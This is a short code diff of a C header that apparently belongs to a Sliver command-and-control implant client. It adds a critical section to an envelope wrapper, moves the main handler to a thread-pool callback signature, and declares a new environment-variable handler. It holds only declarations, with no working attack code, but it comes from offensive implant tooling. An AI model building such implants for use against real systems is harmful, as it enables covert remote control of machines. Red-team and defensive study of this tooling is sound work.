@@ -324,14 +324,22 @@ typedef struct _ENVELOPE {
 typedef struct _ENVELOPE_WRAPPER {
 	PSLIVER_HTTP_CLIENT pSliverClient;
 	PENVELOPE pEnvelope;
+	CRITICAL_SECTION CriticalSection;
 } ENVELOPE_WRAPPER, * PENVELOPE_WRAPPER;
 
 VOID MainHandler
 (
-	_In_ PENVELOPE_WRAPPER pWrapper
+	_Inout_ PTP_CALLBACK_INSTANCE Instance,
+	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
+	_Inout_ PTP_WORK Work
 );
 
 PENVELOPE CdHandler
+(
+	_In_ PENVELOPE pEnvelope
+);
+
+PENVELOPE GetEnvHandler
 (
 	_In_ PENVELOPE pEnvelope
 );
